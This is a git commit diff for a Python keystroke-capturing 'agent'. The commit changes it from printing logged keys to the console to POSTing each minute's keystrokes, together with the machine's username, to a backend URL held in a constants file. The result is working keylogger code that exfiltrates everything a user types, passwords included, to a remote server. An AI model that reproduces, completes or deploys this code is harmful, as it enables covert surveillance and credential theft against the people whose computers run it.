a8db24fed60f53445ce7846a8c6a6ad98f06cbdd
elazar <tkgzreuckr@gmail.com>
2025-09-01 14:04:17 +0300

    send logs to backend instead of console

--- agent/main.py
+++ agent/main.py
@@ -1,5 +1,6 @@
 import keyboard
 import get_key
+from agent.print_keystrokes import send_logs_to_backend
 from text_by_minute import key_by_minute
 from print_keystrokes import print_key_log
 from chek_if_show import check_if_get_show
@@ -8,7 +9,7 @@ def call_on_key(e):
     get_key.on_key(e)
     if check_if_get_show(get_key.details_keys):
         r_key_by_minute = key_by_minute(get_key.details_keys)
-        print_key_log(r_key_by_minute)
+        send_logs_to_backend(r_key_by_minute)
         get_key.details_keys.clear()
 
 keyboard.on_press(call_on_key)
--- agent/print_keystrokes.py
+++ agent/print_keystrokes.py
@@ -1,7 +1,31 @@
+from getpass import getuser
+
+import requests
+
+import consts
+
+
 def print_key_log(list_minute_of_keys):
-    for i, minute_of_keys in enumerate(list_minute_of_keys):
-        for key, value in minute_of_keys.items():
-            if i == len(list_minute_of_keys)-1:
-                value = value[:-4]
-            print("*****", key, "*****")
-            print(value)
+
+
+    print(list_minute_of_keys)
+    # for i, minute_of_keys in enumerate(list_minute_of_keys):
+    #     for key, value in minute_of_keys.items():
+    #         if i == len(list_minute_of_keys)-1:
+    #             value = value[:-4]
+    #         print("*****", key, "*****")
+    #         print(value)
+
+
+def send_logs_to_backend(list_minute_of_keys):
+    username = getuser()
+
+    for minute in list_minute_of_keys:
+        items = list(minute.items())[0]
+        print(list(items))
+        data = {
+            "time": items[0],
+            "events": items[1],
+            "machine": username,
+        }
+        requests.post(consts.BASE_URL + "/logs", json=data)
